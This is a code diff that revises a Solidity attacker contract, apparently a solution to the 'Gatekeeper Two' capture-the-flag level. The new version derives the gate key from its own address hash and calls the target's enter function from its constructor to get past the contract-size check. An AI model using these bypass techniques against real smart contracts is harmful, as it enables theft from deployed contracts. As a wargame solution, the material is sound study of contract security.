@@ -1,23 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IGatekeeperTwoGateTwo {
+interface IGatekeeperTwo {
     function enter(bytes8) external returns (bool);
 }
 
-contract GatekeeperTwoGateTwoAttacker {
+contract GatekeeperTwoAttacker {
     address public gatekeeperTwoAddress;
     bytes8 public gateKey;
 
     constructor(address _gatekeeperTwoAddress) {
         gatekeeperTwoAddress = _gatekeeperTwoAddress;
-        gateKey = 0x0000000100005df6;
-    }
-
-    function attack() public {
-        (result, ) = gatekeeperTwoAddress.call(
+        gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max); 
+        (bool result, ) = gatekeeperTwoAddress.call(
             abi.encodeWithSignature("enter(bytes8)", gateKey)
         );
-        require(success, "Attack failed");
+        require(result, "Attack failed");
     }
 }
